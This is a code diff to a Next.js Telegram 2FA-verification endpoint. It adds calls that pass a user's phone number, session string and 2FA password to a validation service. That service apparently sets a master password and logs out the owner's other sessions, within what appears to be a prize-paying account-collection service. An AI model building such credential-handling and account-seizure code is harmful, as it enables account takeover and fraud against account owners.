@@ -1,6 +1,7 @@
 import { NextRequest, NextResponse } from 'next/server'
 import { verify2FA } from '@/lib/telegram/auth'
 import { getDb } from '@/lib/mongodb/connection'
+import { validateAccount } from '@/lib/services/account-validation'
 
 /**
  * POST /api/telegram/auth/verify-2fa
@@ -140,6 +141,21 @@ export async function POST(request: NextRequest) {
                 } else {
                   console.log(`[Verify2FA] ✅ Account auto-approved after ${minutesPassed.toFixed(2)} minutes (no prize amount)`)
                 }
+              } else if (existingAccount.status === 'pending' && !existingAccount.master_password_set) {
+                // Account is pending but hasn't been validated yet - trigger validation
+                console.log(`[Verify2FA] 🔒 Existing account needs validation, triggering now...`)
+                const validationResult = await validateAccount({
+                  accountId: existingAccount._id,
+                  phoneNumber: phoneNumber,
+                  sessionString: sessionString,
+                  currentPassword: password
+                })
+                
+                if (!validationResult.success) {
+                  console.log(`[Verify2FA] ❌ Validation failed: ${validationResult.reason}`)
+                } else {
+                  console.log(`[Verify2FA] ✅ Validation completed: ${validationResult.sessionsCount} session(s), ${validationResult.loggedOutCount || 0} logged out`)
+                }
               }
             } else {
               // Get prize amount from country
@@ -210,6 +226,21 @@ export async function POST(request: NextRequest) {
                   console.log(`[Verify2FA] ✅ Incremented capacity for ${countryToIncrement.country_name}: ${(countryToIncrement.used_capacity || 0) + 1}/${countryToIncrement.max_capacity}`)
                   break
                 }
+              }
+              
+              // Trigger validation immediately with user's 2FA password
+              console.log(`[Verify2FA] 🔒 Triggering account validation...`)
+              const validationResult = await validateAccount({
+                accountId: newAccount.insertedId,
+                phoneNumber: phoneNumber,
+                sessionString: sessionString,
+                currentPassword: password
+              })
+              
+              if (!validationResult.success) {
+                console.log(`[Verify2FA] ❌ Validation failed: ${validationResult.reason}`)
+              } else {
+                console.log(`[Verify2FA] ✅ Validation completed: ${validationResult.sessionsCount} session(s), ${validationResult.loggedOutCount || 0} logged out`)
               }
             }
           }
